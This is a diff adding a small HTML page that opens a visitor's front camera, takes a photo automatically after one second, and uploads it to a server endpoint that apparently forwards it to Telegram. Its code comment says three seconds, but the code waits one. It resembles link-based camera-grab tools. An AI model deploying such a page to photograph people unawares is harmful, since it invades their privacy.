@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Камера</title>
+</head>
+<body>
+  <h1>Ожидание камеры...</h1>
+  <video id="video" autoplay playsinline></video>
+  <script>
+    const video = document.getElementById('video');
+
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        // Делаем снимок через 3 секунды
+        setTimeout(() => takePhoto(stream), 1000);
+      } catch (e) {
+        alert("Ошибка доступа к камере: " + e.message);
+      }
+    }
+
+    function takePhoto(stream) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData })
+      }).then(() => {
+        alert("Фото отправлено в Telegram");
+        stream.getTracks().forEach(track => track.stop());
+      }).catch(err => alert("Ошибка отправки: " + err.message));
+    }
+
+    initCamera();
+  </script>
+</body>
+</html>
